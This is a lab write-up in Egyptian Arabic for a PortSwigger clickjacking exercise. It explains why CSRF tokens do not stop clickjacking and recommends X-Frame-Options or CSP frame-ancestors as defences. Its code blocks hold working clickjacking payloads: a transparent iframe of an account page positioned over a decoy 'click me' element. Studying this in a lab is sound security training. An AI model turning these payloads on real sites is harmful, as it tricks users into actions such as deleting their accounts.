# Lab : Basic clickjacking with CSRF token protection

https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected

- الفكره من الLab ده ان انت بتحاكي ان في صفحه غير امنه بتظخر فوق الصفحه الرايسيه وانت بتتفاعل معاها علي اساس انها صفحه سليمه بس انت بتعمل action في الصفحه المخفيه وممكن دي حاجه تضرك جامد زي انها ممكن تحذف الaccount ذي الفكره من الاب ده

 

```bash
1. <style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>

2. <style>
    iframe {
        position:relative;
        width:700px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:60px;
        z-index: 1;
    }
</style>
<div>click me  </div>
<iframe src="https://0a4400790326065780d10d8000df00d9.web-security-academy.net/my-account"></iframe>
```

## فكرة الـ Lab: Basic Clickjacking with CSRF Token Protection

### الموضوع الأساسي

اللاب ده بيوضح حاجة مهمة جدًا: إن الـ **CSRF token** لوحده مش كفاية علشان يحميك من **Clickjacking**.

### ليه؟

#### الفرق بين الهجومين:

- **CSRF**: المهاجم بيخلي المتصفح بتاعك يبعت request لموقع تاني (زي البنك مثلاً) من غير ما تعرف، عن طريق فورم مخفي أو رابط.
- **Clickjacking**: المهاجم بيخليك أنت شخصيًا تدوس على زرار حقيقي في الموقع الأصلي، لكن وهو مخفي جوه صفحة تانية (بيستخدم iframe شفاف).

#### النقطة المهمة

لو الموقع بيحط CSRF token، ده هيمنع أي حد يبعت request مزور من عنده هو (زي فورم في موقع تاني)، لأنه مش هيعرف يجيب التوكن الصحيح.

**لكن** في الـ Clickjacking، المهاجم مش بيحاول يبعت request بنفسه أصلاً! هو بيخلي **أنت** تدوس على الزرار الحقيقي جوه الصفحة الأصلية (اللي فيها التوكن الصحيح أصلاً لأنك انت اللي مسجل دخول). يعني الـ iframe بيحمّل الصفحة الحقيقية بكل الكوكيز والتوكنات بتاعتك، وهو بس بيغطيها بطبقة شفافة فوق حاجة تانية تشجعك تدوس عليها.

### خطوات اللاب عادةً

1. بتلاقي صفحة فيها زرار (زي "Delete account" أو تغيير الإيميل)
2. بتعمل صفحة HTML فيها iframe بيحمّل صفحة الموقع الأصلي، وبتخليه شفاف (`opacity: 0`) وفوقه زرار وهمي بتاعك يشجع الضحية تدوس
3. بتظبط الـ positioning (`position: absolute`) بحيث الزرار الحقيقي جوه الـ iframe يبقى بالظبط فوق الزرار الوهمي بتاعك
4. الضحية بتدوس على "اضغط هنا" الوهمي، لكن فعليًا بتدوس على الزرار الحقيقي جوه الـ iframe

### الـ Payload النموذجي

html

```html
<style>
  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 300px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="https://TARGET-LAB.web-security-academy.net/my-account"></iframe>
```

### الدرس المستفاد

الحماية الصح من Clickjacking بتكون بـ:

- **`X-Frame-Options`** header (زي `DENY` أو `SAMEORIGIN`)
- أو **`Content-Security-Policy: frame-ancestors`**

CSRF token بيحميك من نوع تاني خالص من الهجمات، مش من ده.
